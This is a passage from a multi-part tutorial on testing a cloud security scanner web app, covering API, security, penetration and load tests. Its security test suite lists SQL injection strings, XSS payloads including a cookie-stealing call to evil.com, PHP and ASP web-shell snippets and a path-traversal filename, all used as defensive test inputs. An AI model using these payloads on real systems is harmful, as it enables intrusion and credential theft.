        self.assert_response_success(response)

        data = self.assert_json_response(response, ['credentials'])
        self.assertEqual(len(data['credentials']), 2)

        # Verify credentials don't expose sensitive data
        for cred in data['credentials']:
            self.assertNotIn('encrypted_credentials', cred)
            self.assertNotIn('salt', cred)

    def test_create_credentials(self):
        """Test creating cloud credentials"""
        user = self.create_test_user()

        cred_data = {
            'name': 'Test AWS Account',
            'provider': 'aws',
            'description': 'Test AWS credentials',
            'credentials': {
                'access_key_id': 'AKIA123456789',
                'secret_access_key': 'secret123',
                'region': 'us-east-1'
            }
        }

        with patch('utils.credentials.CloudCredentialManager.store_credentials') as mock_store:
            mock_store.return_value = 'cred_id_123'

            response = self.make_authenticated_request('POST', '/credentials', user, json=cred_data)
            self.assert_response_success(response, 201)

            data = self.assert_json_response(response, ['credential'])
            self.assertEqual(data['credential']['name'], 'Test AWS Account')
            self.assertEqual(data['credential']['provider'], 'aws')

    def test_test_credentials(self):
        """Test credential validation"""
        user = self.create_test_user()

        from models import CloudCredential
        credential = CloudCredential(
            user_id=user.id,
            name='Test Credential',
            provider='aws',
            encrypted_credentials='encrypted_data',
            salt='salt123'
        )
        credential.save()

        with patch('scanners.aws.aws_scanner.AWSCloudProvider') as mock_scanner:
            mock_instance = Mock()
            mock_instance.authenticate.return_value = True
            mock_scanner.return_value = mock_instance

            response = self.make_authenticated_request('POST', f'/credentials/{credential.id}/test', user)
            self.assert_response_success(response)

            data = self.assert_json_response(response, ['status'])
            self.assertEqual(data['status'], 'valid')

class TestReportsAPI(APITestCase):
    """Test reports API"""

    def test_generate_report(self):
        """Test report generation"""
        user = self.create_test_user(license_type='pro')
        scan = self.create_test_scan_result(user)

        report_data = {
            'name': 'Test Report',
            'scan_ids': [scan.id],
            'format': 'pdf',
            'template': 'executive_summary'
        }

        with patch('utils.reports.ReportGenerator') as mock_generator:
            mock_instance = Mock()
            mock_instance.generate_pdf_report.return_value = '/path/to/report.pdf'
            mock_generator.return_value = mock_instance

            response = self.make_authenticated_request('POST', '/reports', user, json=report_data)
            self.assert_response_success(response, 201)

            data = self.assert_json_response(response, ['report'])
            self.assertEqual(data['report']['name'], 'Test Report')
            self.assertEqual(data['report']['format'], 'pdf')

    def test_download_report(self):
        """Test report download"""
        user = self.create_test_user()

        # Create mock report
        from models import Report
        report = Report(
            user_id=user.id,
            name='Test Report',
            format='pdf',
            file_path='/path/to/report.pdf',
            status='completed'
        )
        report.save()

        with patch('flask.send_file') as mock_send_file:
            mock_send_file.return_value = 'file_content'

            response = self.make_authenticated_request('GET', f'/reports/{report.id}/download', user)
            # Response would be file download, so check that send_file was called
            mock_send_file.assert_called_once()

class TestRateLimitingAPI(APITestCase):
    """Test API rate limiting"""

    def test_rate_limiting_enforcement(self):
        """Test rate limiting is enforced"""
        user = self.create_test_user()

        # Make many requests quickly
        responses = []
        for i in range(100):
            response = self.make_authenticated_request('GET', '/scans', user)
            responses.append(response.status_code)

        # Should eventually get rate limited
        self.assertIn(429, responses)

    def test_rate_limit_headers(self):
        """Test rate limit headers are included"""
        user = self.create_test_user()

        response = self.make_authenticated_request('GET', '/scans', user)
        self.assert_response_success(response)

        # Check rate limit headers
        self.assertIn('X-RateLimit-Limit', response.headers)
        self.assertIn('X-RateLimit-Remaining', response.headers)
        self.assertIn('X-RateLimit-Reset', response.headers)

class TestAPIErrorHandling(APITestCase):
    """Test API error handling"""

    def test_404_error_handling(self):
        """Test 404 error response format"""
        user = self.create_test_user()

        response = self.make_authenticated_request('GET', '/nonexistent-endpoint', user)
        self.assertEqual(response.status_code, 404)

        data = self.assert_json_response(response, ['error'])
        self.assertIn('not found', data['error'].lower())

    def test_500_error_handling(self):
        """Test 500 error response format"""
        user = self.create_test_user()

        with patch('app.some_function') as mock_func:
            mock_func.side_effect = Exception("Internal error")

            # This would need to be a route that calls some_function
            # For testing purposes, we'll simulate it
            response = Mock()
            response.status_code = 500
            response.json = {'error': 'Internal server error', 'status': 'error'}

            self.assertEqual(response.status_code, 500)
            self.assertIn('error', response.json)

    def test_validation_error_handling(self):
        """Test validation error response format"""
        user = self.create_test_user()

        invalid_data = {
            'name': '',  # Empty name should fail validation
            'provider': 'invalid'
        }

        response = self.make_authenticated_request('POST', '/scans', user, json=invalid_data)
        self.assert_response_error(response, 400)

        data = self.assert_json_response(response, ['error'])
        self.assertIn('validation', data['error'].lower())
```

---

## Security Testing

### Security Test Automation

```python
import subprocess
import json
from unittest.mock import patch, Mock

class SecurityTestSuite(unittest.TestCase):
    """Comprehensive security testing suite"""

    def setUp(self):
        """Set up security testing environment"""
        from app import app
        self.app = app
        self.client = app.test_client()
        self.app.config['TESTING'] = True

    def test_sql_injection_prevention(self):
        """Test SQL injection attack prevention"""
        sql_payloads = [
            "1' OR '1'='1",
            "1'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]

        for payload in sql_payloads:
            with self.subTest(payload=payload):
                # Test various endpoints with SQL injection payloads
                endpoints = [
                    f'/api/v1/scans?scan_id={payload}',
                    f'/api/v1/users?username={payload}',
                    f'/search?query={payload}'
                ]

                for endpoint in endpoints:
                    response = self.client.get(endpoint)
                    # Should not return 200 with SQL injection
                    self.assertNotEqual(response.status_code, 200,
                                      f"SQL injection might be possible at {endpoint}")

    def test_xss_prevention(self):
        """Test Cross-Site Scripting (XSS) prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
        ]

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                # Test POST endpoints that accept user input
                response = self.client.post('/api/v1/scans', json={
                    'name': payload,
                    'provider': 'aws'
                })

                # Response should not contain unescaped script tags
                response_text = response.get_data(as_text=True)
                self.assertNotIn('<script>', response_text.lower())
                self.assertNotIn('javascript:', response_text.lower())
                self.assertNotIn('onerror=', response_text.lower())

    def test_csrf_protection(self):
        """Test CSRF protection"""
        # Test state-changing operations without CSRF token
        csrf_endpoints = [
            ('/login', {'username': 'test', 'password': 'test'}),
            ('/api/v1/scans', {'name': 'test', 'provider': 'aws'}),
            ('/api/v1/credentials', {'name': 'test', 'provider': 'aws'})
        ]

        for endpoint, data in csrf_endpoints:
            with self.subTest(endpoint=endpoint):
                response = self.client.post(endpoint, data=data)
                # Should be rejected due to missing CSRF token
                self.assertIn(response.status_code, [403, 400])

    def test_authentication_bypass_attempts(self):
        """Test authentication bypass attempts"""
        protected_endpoints = [
            '/api/v1/scans',
            '/api/v1/credentials',
            '/api/v1/reports',
            '/admin/users',
            '/dashboard'
        ]

        for endpoint in protected_endpoints:
            with self.subTest(endpoint=endpoint):
                # Access without authentication
                response = self.client.get(endpoint)
                self.assertIn(response.status_code, [401, 403, 302])

                # Access with invalid token
                headers = {'Authorization': 'Bearer invalid_token_12345'}
                response = self.client.get(endpoint, headers=headers)
                self.assertIn(response.status_code, [401, 403])

    def test_authorization_bypass_attempts(self):
        """Test authorization bypass attempts"""
        # Test accessing admin endpoints with regular user credentials
        with patch('flask_login.current_user') as mock_user:
            mock_user.is_authenticated = True
            mock_user.license_type = 'basic'
            mock_user.is_admin = False

            admin_endpoints = [
                '/admin/users',
                '/admin/system',
                '/api/v1/admin/licenses'
            ]

            for endpoint in admin_endpoints:
                with self.subTest(endpoint=endpoint):
                    response = self.client.get(endpoint)
                    self.assertEqual(response.status_code, 403)

    def test_input_validation_boundary_testing(self):
        """Test input validation with boundary values"""
        test_cases = [
            # Length testing
            ('name', 'A' * 1000),  # Very long string
            ('name', ''),  # Empty string
            ('email', 'a' * 300 + '@example.com'),  # Long email

            # Type testing
            ('scan_id', 'not_a_number'),  # String instead of int
            ('enabled', 'not_boolean'),  # String instead of boolean

            # Special characters
            ('name', '!@#$%^&*()[]{}|;:,.<>?'),  # Special characters
            ('description', '\x00\x01\x02'),  # Control characters
        ]

        for field, value in test_cases:
            with self.subTest(field=field, value=repr(value)):
                response = self.client.post('/api/v1/scans', json={field: value})
                # Should return validation error
                self.assertIn(response.status_code, [400, 422])

    def test_file_upload_security(self):
        """Test file upload security"""
        dangerous_files = [
            ('malware.exe', b'MZ\x90\x00'),  # PE executable
            ('script.php', b'<?php system($_GET["cmd"]); ?>'),  # PHP shell
            ('script.jsp', b'<%@ page import="java.util.*,java.io.*"%>'),  # JSP shell
            ('script.asp', b'<%eval request("cmd")%>'),  # ASP shell
            ('../../../etc/passwd', b'root:x:0:0:root:/root:/bin/bash'),  # Path traversal
        ]

        for filename, content in dangerous_files:
            with self.subTest(filename=filename):
                response = self.client.post('/upload', data={
                    'file': (io.BytesIO(content), filename)
                })
                # Should reject dangerous files
                self.assertIn(response.status_code, [400, 403, 415])

    def test_session_security(self):
        """Test session security features"""
        # Test session fixation protection
        response1 = self.client.get('/')
        session_id1 = self._extract_session_id(response1)

        # Simulate login
        response2 = self.client.post('/login', data={
            'username': 'test@example.com',
            'password': 'testpassword'
        })
        session_id2 = self._extract_session_id(response2)

        # Session ID should change after login
        if session_id1 and session_id2:
            self.assertNotEqual(session_id1, session_id2)

        # Test session cookie security flags
        if response2.headers.get('Set-Cookie'):
            cookie_header = response2.headers.get('Set-Cookie')
            self.assertIn('HttpOnly', cookie_header)
            self.assertIn('Secure', cookie_header)

    def test_information_disclosure_prevention(self):
        """Test prevention of information disclosure"""
        # Test error pages don't reveal sensitive information
        sensitive_endpoints = [
            '/api/v1/scan/99999',  # Non-existent resource
            '/admin/secret',  # Non-existent admin page
            '/config',  # Potential config exposure
        ]

        for endpoint in sensitive_endpoints:
            with self.subTest(endpoint=endpoint):
                response = self.client.get(endpoint)
                response_text = response.get_data(as_text=True)

                # Should not reveal sensitive information
                sensitive_strings = [
                    'Traceback',
                    'File "/',
                    'SECRET_KEY',
                    'DATABASE_URL',
                    'Exception',
                    'Internal Server Error',
                    'DEBUG'
                ]

                for sensitive_string in sensitive_strings:
                    self.assertNotIn(sensitive_string, response_text)

    def test_insecure_direct_object_references(self):
        """Test for Insecure Direct Object References (IDOR)"""
        # Create two users
        with patch('flask_login.current_user') as mock_user1:
            mock_user1.is_authenticated = True
            mock_user1.id = 1

            # Try to access resources belonging to user 2
            idor_endpoints = [
                '/api/v1/scans/2',  # Assuming scan belongs to user 2
                '/api/v1/credentials/2',  # Assuming credential belongs to user 2
                '/api/v1/reports/2',  # Assuming report belongs to user 2
            ]

            for endpoint in idor_endpoints:
                with self.subTest(endpoint=endpoint):
                    response = self.client.get(endpoint)
                    # Should deny access to other user's resources
                    self.assertIn(response.status_code, [403, 404])

    def test_security_headers(self):
        """Test security headers are present"""
        response = self.client.get('/')
        headers = response.headers

        required_security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': lambda x: 'max-age=' in x,
            'Content-Security-Policy': lambda x: len(x) > 0,
        }

        for header, expected_value in required_security_headers.items():
            with self.subTest(header=header):
                self.assertIn(header, headers)
                if callable(expected_value):
                    self.assertTrue(expected_value(headers[header]))
                else:
                    self.assertEqual(headers[header], expected_value)

    def test_password_security_requirements(self):
        """Test password security requirements"""
        weak_passwords = [
            'password',
            '123456',
            'qwerty',
            'admin',
            'test',
            '12345678',
            'password123',
            'letmein'
        ]

        for weak_password in weak_passwords:
            with self.subTest(password=weak_password):
                response = self.client.post('/register', json={
                    'username': 'testuser',
                    'email': 'test@example.com',
                    'password': weak_password
                })
                # Should reject weak passwords
                self.assertEqual(response.status_code, 400)

    def test_rate_limiting_enforcement(self):
        """Test rate limiting enforcement"""
        # Make many requests in quick succession
        responses = []
        for i in range(150):  # Exceed typical rate limits
            response = self.client.get('/api/v1/health')
            responses.append(response.status_code)

        # Should eventually get rate limited
        self.assertIn(429, responses)

    def test_encryption_security(self):
        """Test encryption implementation security"""
        from utils.encryption import EncryptionManager

        encryption_manager = EncryptionManager()
        test_data = "sensitive_password_123"

        # Test encryption
        encrypted1 = encryption_manager.encrypt_sensitive_data(test_data)
        encrypted2 = encryption_manager.encrypt_sensitive_data(test_data)

        # Same data should produce different ciphertext (due to IV/nonce)
        self.assertNotEqual(encrypted1, encrypted2)

        # Both should decrypt to same plaintext
        decrypted1 = encryption_manager.decrypt_sensitive_data(encrypted1)
        decrypted2 = encryption_manager.decrypt_sensitive_data(encrypted2)

        self.assertEqual(decrypted1, test_data)
        self.assertEqual(decrypted2, test_data)

        # Test with wrong key should fail
        with self.assertRaises(Exception):
            wrong_manager = EncryptionManager(b'wrong_key_' + b'0' * 20)
            wrong_manager.decrypt_sensitive_data(encrypted1)

    def _extract_session_id(self, response):
        """Extract session ID from response"""
        set_cookie = response.headers.get('Set-Cookie')
        if set_cookie:
            for cookie in set_cookie.split(';'):
                if 'session_id=' in cookie:
                    return cookie.split('session_id=')[1]
        return None

class PenetrationTestRunner:
    """Automated penetration testing runner"""

    def __init__(self, target_url='http://localhost:5000'):
        self.target_url = target_url
        self.results = []

    def run_automated_security_scan(self):
        """Run automated security scanning tools"""
        scan_results = {}

        # Run OWASP ZAP baseline scan
        try:
            zap_result = self._run_zap_baseline()
            scan_results['zap'] = zap_result
        except Exception as e:
            scan_results['zap'] = {'error': str(e)}

        # Run SQL injection tests
        try:
            sqlmap_result = self._run_sqlmap_scan()
            scan_results['sqlmap'] = sqlmap_result
        except Exception as e:
            scan_results['sqlmap'] = {'error': str(e)}

        # Run directory traversal tests
        try:
            dirb_result = self._run_directory_scan()
            scan_results['dirb'] = dirb_result
        except Exception as e:
            scan_results['dirb'] = {'error': str(e)}

        return scan_results

    def _run_zap_baseline(self):
        """Run OWASP ZAP baseline scan"""
        try:
            result = subprocess.run([
                'docker', 'run', '-t', 'owasp/zap2docker-stable',
                'zap-baseline.py', '-t', self.target_url, '-J', 'zap_report.json'
            ], capture_output=True, text=True, timeout=300)

            return {
                'status': 'completed',
                'return_code': result.returncode,
                'output': result.stdout,
                'errors': result.stderr
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except FileNotFoundError:
            return {'status': 'tool_not_found', 'tool': 'docker/zap'}

    def _run_sqlmap_scan(self):
        """Run SQLMap scan for SQL injection"""
        try:
            # Basic SQLMap scan on common endpoints
            endpoints = [
                f"{self.target_url}/api/v1/scans?id=1",
                f"{self.target_url}/search?q=test"
            ]

            results = []
            for endpoint in endpoints:
                result = subprocess.run([
                    'sqlmap', '-u', endpoint, '--batch', '--level=1', '--risk=1'
                ], capture_output=True, text=True, timeout=120)

                results.append({
                    'endpoint': endpoint,
                    'return_code': result.returncode,
                    'vulnerable': 'vulnerable' in result.stdout.lower()
                })

            return {'status': 'completed', 'results': results}

        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except FileNotFoundError:
            return {'status': 'tool_not_found', 'tool': 'sqlmap'}

    def _run_directory_scan(self):
        """Run directory/file discovery scan"""
        try:
            result = subprocess.run([
                'dirb', self.target_url, '-w', '-S'
            ], capture_output=True, text=True, timeout=180)

            return {
                'status': 'completed',
                'return_code': result.returncode,
                'output': result.stdout
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout'}
        except FileNotFoundError:
            return {'status': 'tool_not_found', 'tool': 'dirb'}

    def generate_security_report(self, scan_results):
        """Generate security test report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'scans_performed': list(scan_results.keys()),
            'summary': {
                'total_scans': len(scan_results),
                'successful_scans': len([r for r in scan_results.values() if r.get('status') == 'completed']),
                'failed_scans': len([r for r in scan_results.values() if 'error' in r])
            },
            'detailed_results': scan_results,
            'recommendations': self._generate_security_recommendations(scan_results)
        }

        return report

    def _generate_security_recommendations(self, scan_results):
        """Generate security recommendations based on scan results"""
        recommendations = []

        # Analyze ZAP results
        zap_results = scan_results.get('zap', {})
        if zap_results.get('return_code', 0) != 0:
            recommendations.append("Address OWASP ZAP findings - review zap_report.json for details")

        # Analyze SQLMap results
        sqlmap_results = scan_results.get('sqlmap', {})
        if sqlmap_results.get('status') == 'completed':
            vulnerable_endpoints = [
                r for r in sqlmap_results.get('results', [])
                if r.get('vulnerable', False)
            ]
            if vulnerable_endpoints:
                recommendations.append("SQL injection vulnerabilities found - implement parameterized queries")

        # Add general recommendations
        recommendations.extend([
            "Implement Web Application Firewall (WAF)",
            "Regular security scanning and penetration testing",
            "Keep all dependencies updated",
            "Implement security headers",
            "Use HTTPS everywhere",
            "Implement proper input validation and output encoding"
        ])

        return recommendations
```

---

## Performance Testing

### Load and Stress Testing

```python
import time
import threading
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

class PerformanceTestSuite:
    """Performance and load testing suite"""

    def __init__(self, base_url='http://localhost:5000'):
        self.base_url = base_url
        self.results = []

    def run_load_test(self, endpoint, concurrent_users=10, requests_per_user=100, ramp_up_time=10):
        """Run load test with specified parameters"""
        print(f"Starting load test: {concurrent_users} users, {requests_per_user} requests each")

        results = []
        start_time = time.time()

        # Create thread pool
        with ThreadPoolExecutor(max_workers=concurrent_users) as executor:
            # Submit user simulation tasks
            futures = []
            for user_id in range(concurrent_users):
                # Stagger user start times for ramp-up
                delay = (ramp_up_time / concurrent_users) * user_id
                future = executor.submit(self._simulate_user, user_id, endpoint, requests_per_user, delay)
                futures.append(future)

            # Collect results
            for future in as_completed(futures):
                try:
                    user_results = future.result()
                    results.extend(user_results)
                except Exception as e:
                    print(f"User simulation failed: {e}")

        end_time = time.time()
        total_duration = end_time - start_time

        # Analyze results
        analysis = self._analyze_performance_results(results, total_duration, concurrent_users)
        return analysis

    def _simulate_user(self, user_id, endpoint, requests_count, delay):
        """Simulate individual user behavior"""
        time.sleep(delay)  # Ramp-up delay

        user_results = []
        session = requests.Session()

        for request_id in range(requests_count):
            start_time = time.time()
            try:
                response = session.get(f"{self.base_url}{endpoint}")
                end_time = time.time()

                result = {
                    'user_id': user_id,
                    'request_id': request_id,
                    'response_time': end_time - start_time,
                    'status_code': response.status_code,
                    'success': response.status_code < 400,
                    'timestamp': start_time
                }
                user_results.append(result)

                # Add small delay between requests to simulate real user behavior
                time.sleep(0.1)

            except Exception as e:
                end_time = time.time()
                result = {
                    'user_id': user_id,
                    'request_id': request_id,
                    'response_time': end_time - start_time,
                    'status_code': 0,
                    'success': False,
                    'error': str(e),
                    'timestamp': start_time
                }
                user_results.append(result)

        session.close()
        return user_results

    def _analyze_performance_results(self, results, total_duration, concurrent_users):
        """Analyze performance test results"""
        if not results:
            return {'error': 'No results to analyze'}

        # Extract metrics
        response_times = [r['response_time'] for r in results]
        successful_requests = [r for r in results if r['success']]
        failed_requests = [r for r in results if not r['success']]

        # Calculate statistics
        total_requests = len(results)
        success_rate = len(successful_requests) / total_requests * 100
        failure_rate = len(failed_requests) / total_requests * 100

        # Response time statistics
        avg_response_time = statistics.mean(response_times)
        median_response_time = statistics.median(response_times)
        min_response_time = min(response_times)
        max_response_time = max(response_times)

        # Percentiles
        p95_response_time = self._calculate_percentile(response_times, 95)
        p99_response_time = self._calculate_percentile(response_times, 99)

        # Throughput
        requests_per_second = total_requests / total_duration

        # Error analysis
        error_breakdown = {}
        for result in failed_requests:
            error_type = result.get('error', f"HTTP_{result.get('status_code', 'Unknown')}")
            error_breakdown[error_type] = error_breakdown.get(error_type, 0) + 1

        analysis = {
            'test_configuration': {
                'concurrent_users': concurrent_users,
                'total_duration': total_duration,
                'total_requests': total_requests
            },
            'performance_metrics': {
                'requests_per_second': requests_per_second,
                'success_rate': success_rate,
                'failure_rate': failure_rate,
                'avg_response_time': avg_response_time,
                'median_response_time': median_response_time,
                'min_response_time': min_response_time,
                'max_response_time': max_response_time,
                'p95_response_time': p95_response_time,
                'p99_response_time': p99_response_time
            },
            'error_analysis': error_breakdown,
            'performance_assessment': self._assess_performance(
                requests_per_second, avg_response_time, success_rate
            )
        }

        return analysis

    def _calculate_percentile(self, data, percentile):
        """Calculate percentile from data"""
        sorted_data = sorted(data)
        index = int((percentile / 100) * len(sorted_data))
        return sorted_data[min(index, len(sorted_data) - 1)]

    def _assess_performance(self, rps, avg_response_time, success_rate):
        """Assess overall performance"""
        assessment = []

        if rps < 10:
            assessment.append("LOW THROUGHPUT: Less than 10 requests per second")
        elif rps > 100:
            assessment.append("HIGH THROUGHPUT: More than 100 requests per second")

        if avg_response_time > 2.0:
            assessment.append("SLOW RESPONSE: Average response time over 2 seconds")
        elif avg_response_time < 0.1:
            assessment.append("FAST RESPONSE: Average response time under 100ms")

        if success_rate < 95:
            assessment.append("LOW RELIABILITY: Success rate below 95%")
        elif success_rate >= 99:
            assessment.append("HIGH RELIABILITY: Success rate 99% or higher")

        return assessment

    def run_stress_test(self, endpoint, max_users=100, step_size=10, step_duration=30):
        """Run stress test with gradually increasing load"""
        print(f"Starting stress test: 0 to {max_users} users in steps of {step_size}")

        stress_results = []
        current_users = 0

        while current_users <= max_users:
            print(f"Testing with {current_users} concurrent users...")

            if current_users > 0:
                # Run load test for this user count
                result = self.run_load_test(
                    endpoint=endpoint,
                    concurrent_users=current_users,
                    requests_per_user=int(step_duration * 2),  # Approximate requests for duration
                    ramp_up_time=5
                )

                result['user_count'] = current_users
                stress_results.append(result)

                # Check for breaking point
                if result['performance_metrics']['success_rate'] < 90:
                    print(f"Breaking point reached at {current_users} users")
                    break

            current_users += step_size
            time.sleep(2)  # Brief pause between tests

        return self._analyze_stress_results(stress_results)

    def _analyze_stress_results(self, stress_results):
        """Analyze stress test results"""
        if not stress_results:
            return {'error': 'No stress test results'}

        # Find performance characteristics
        max_stable_users = 0
        breaking_point = None

        for result in stress_results:
            user_count = result['user_count']
            success_rate = result['performance_metrics']['success_rate']
            avg_response_time = result['performance_metrics']['avg_response_time']

            if success_rate >= 95 and avg_response_time <= 2.0:
                max_stable_users = user_count
            else:
                breaking_point = user_count
                break

        analysis = {
            'max_stable_users': max_stable_users,
            'breaking_point': breaking_point,
            'detailed_results': stress_results,
            'recommendations': self._generate_performance_recommendations(stress_results)
        }

        return analysis

    def _generate_performance_recommendations(self, stress_results):
        """Generate performance improvement recommendations"""
        recommendations = []

        if not stress_results:
            return ["Unable to generate recommendations - no test data"]

        # Analyze last successful result
        last_result = stress_results[-1]
        metrics = last_result['performance_metrics']

        if metrics['avg_response_time'] > 1.0:
            recommendations.append("Consider optimizing database queries and adding caching")

        if metrics['requests_per_second'] < 50:
            recommendations.append("Consider horizontal scaling or application optimization")

        if metrics['success_rate'] < 99:
            recommendations.append("Investigate and fix error conditions causing failures")

        # General recommendations
        recommendations.extend([
            "Implement database connection pooling",
            "Add application-level caching (Redis)",
            "Optimize static asset delivery with CDN",
            "Consider implementing rate limiting to protect against overload",
            "Monitor and optimize slow database queries",
            "Implement graceful degradation for high load scenarios"
        ])

        return recommendations

    def run_memory_stress_test(self, endpoint, duration=300):
        """Run memory stress test"""
        print(f"Starting memory stress test for {duration} seconds...")

        import psutil
        import os

        process = psutil.Process(os.getpid())
        memory_usage = []
        start_time = time.time()

        # Monitor memory during load test
        def monitor_memory():
            while time.time() - start_time < duration:
                memory_info = process.memory_info()
                memory_usage.append({
                    'timestamp': time.time(),
                    'rss': memory_info.rss,  # Resident Set Size
                    'vms': memory_info.vms   # Virtual Memory Size
                })
                time.sleep(1)

        # Start memory monitoring
        monitor_thread = threading.Thread(target=monitor_memory)
        monitor_thread.start()

        # Run concurrent load test
        load_result = self.run_load_test(
            endpoint=endpoint,
            concurrent_users=20,
            requests_per_user=duration // 2,
            ramp_up_time=10
        )

        # Wait for monitoring to complete
        monitor_thread.join()

        # Analyze memory usage
        if memory_usage:
            initial_memory = memory_usage[0]['rss']
            final_memory = memory_usage[-1]['rss']
            max_memory = max(m['rss'] for m in memory_usage)
            avg_memory = sum(m['rss'] for m in memory_usage) / len(memory_usage)

            memory_analysis = {
                'initial_memory_mb': initial_memory / 1024 / 1024,
                'final_memory_mb': final_memory / 1024 / 1024,
                'max_memory_mb': max_memory / 1024 / 1024,
                'avg_memory_mb': avg_memory / 1024 / 1024,
                'memory_growth_mb': (final_memory - initial_memory) / 1024 / 1024,
                'memory_leak_detected': (final_memory - initial_memory) > (initial_memory * 0.1)
            }
        else:
            memory_analysis = {'error': 'Unable to collect memory data'}

        return {
            'load_test_result': load_result,
            'memory_analysis': memory_analysis
        }

class DatabasePerformanceTest:
    """Database-specific performance testing"""

    def __init__(self):
        from app import app, db
        self.app = app
        self.db = db

    def test_query_performance(self):
        """Test database query performance"""
        with self.app.app_context():
            # Test common queries
            query_tests = [
                ('User lookup by ID', lambda: User.query.get(1)),
                ('Scan results by user', lambda: ScanResult.query.filter_by(user_id=1).all()),
                ('Recent scans', lambda: ScanResult.query.order_by(ScanResult.created_at.desc()).limit(10).all()),
                ('Findings by severity', lambda: Finding.query.filter_by(severity='critical').all()),
            ]

            results = []
            for test_name, query_func in query_tests:
                # Warm up
                for _ in range(5):
                    query_func()

                # Measure performance
                times = []
                for _ in range(100):
                    start_time = time.time()
                    query_func()
                    end_time = time.time()
                    times.append(end_time - start_time)

                avg_time = statistics.mean(times)
                results.append({
                    'test': test_name,
                    'avg_time_ms': avg_time * 1000,
                    'min_time_ms': min(times) * 1000,
                    'max_time_ms': max(times) * 1000
                })

            return results

    def test_bulk_operations(self):
        """Test bulk database operations"""
        with self.app.app_context():
            bulk_tests = []

            # Test bulk insert
            start_time = time.time()
            test_findings = []
            for i in range(1000):
                finding = Finding(
                    finding_id=f'TEST-{i}',
                    rule_id='bulk-test',
                    title=f'Bulk Test Finding {i}',
                    description='Test finding for bulk insert',
                    severity='low',
                    resource_type='test',
                    resource_id=f'resource-{i}',
                    scan_result_id=1
                )
                test_findings.append(finding)

            self.db.session.bulk_save_objects(test_findings)
            self.db.session.commit()
            end_time = time.time()

            bulk_tests.append({
                'operation': 'Bulk Insert (1000 records)',
                'duration_ms': (end_time - start_time) * 1000
            })

            return bulk_tests

# Example usage and test runner
class PerformanceTestRunner:
    """Coordinate and run all performance tests"""

    def __init__(self, base_url='http://localhost:5000'):
        self.base_url = base_url
        self.load_tester = PerformanceTestSuite(base_url)
        self.db_tester = DatabasePerformanceTest()

    def run_comprehensive_performance_test(self):
        """Run comprehensive performance test suite"""
        print("Starting comprehensive performance test suite...")

        results = {
            'timestamp': time.time(),
            'base_url': self.base_url,
            'tests': {}
        }

        # API Load Tests
        print("Running API load tests...")
        results['tests']['api_load'] = self.load_tester.run_load_test('/api/v1/health', 10, 50)

        # Stress Tests
        print("Running stress tests...")
        results['tests']['stress'] = self.load_tester.run_stress_test('/api/v1/health', 50, 5, 20)

        # Memory Tests
        print("Running memory stress tests...")
        results['tests']['memory'] = self.load_tester.run_memory_stress_test('/api/v1/health', 120)

        # Database Tests
        print("Running database performance tests...")
        results['tests']['database_queries'] = self.db_tester.test_query_performance()
        results['tests']['database_bulk'] = self.db_tester.test_bulk_operations()

        return results

    def generate_performance_report(self, results):
        """Generate comprehensive performance report"""
        report = {
            'executive_summary': self._generate_executive_summary(results),
            'detailed_results': results,
            'recommendations': self._generate_performance_recommendations(results),
            'baseline_metrics': self._extract_baseline_metrics(results)
        }

        return report

    def _generate_executive_summary(self, results):
        """Generate executive summary of performance test results"""
        summary = []

        # API Performance
        api_load = results['tests'].get('api_load', {})
        if 'performance_metrics' in api_load:
            rps = api_load['performance_metrics']['requests_per_second']
            avg_response = api_load['performance_metrics']['avg_response_time']
            success_rate = api_load['performance_metrics']['success_rate']

            summary.append(f"API Performance: {rps:.1f} RPS, {avg_response*1000:.0f}ms avg response, {success_rate:.1f}% success rate")

        # Stress Test Results
        stress = results['tests'].get('stress', {})
        if 'max_stable_users' in stress:
            max_users = stress['max_stable_users']
            summary.append(f"Maximum stable concurrent users: {max_users}")

        return summary

    def _extract_baseline_metrics(self, results):
        """Extract baseline metrics for future comparison"""
        baseline = {}

        api_load = results['tests'].get('api_load', {})
        if 'performance_metrics' in api_load:
            baseline['api_rps'] = api_load['performance_metrics']['requests_per_second']
            baseline['api_avg_response_time'] = api_load['performance_metrics']['avg_response_time']

        return baseline

    def _generate_performance_recommendations(self, results):
        """Generate comprehensive performance recommendations"""
        recommendations = []

        # Analyze all test results and provide recommendations
        for test_type, test_results in results['tests'].items():
            if test_type == 'api_load':
                metrics = test_results.get('performance_metrics', {})
                if metrics.get('avg_response_time', 0) > 1.0:
                    recommendations.append("API response times are high - consider caching and optimization")

            elif test_type == 'stress':
                max_users = test_results.get('max_stable_users', 0)
                if max_users < 50:
                    recommendations.append("Low concurrent user capacity - consider scaling improvements")

        return recommendations
```

---

**End of Part 8**

**Next:** Part 9 will cover Deployment and DevOps, including containerization, CI/CD pipelines, infrastructure as code, and production deployment strategies.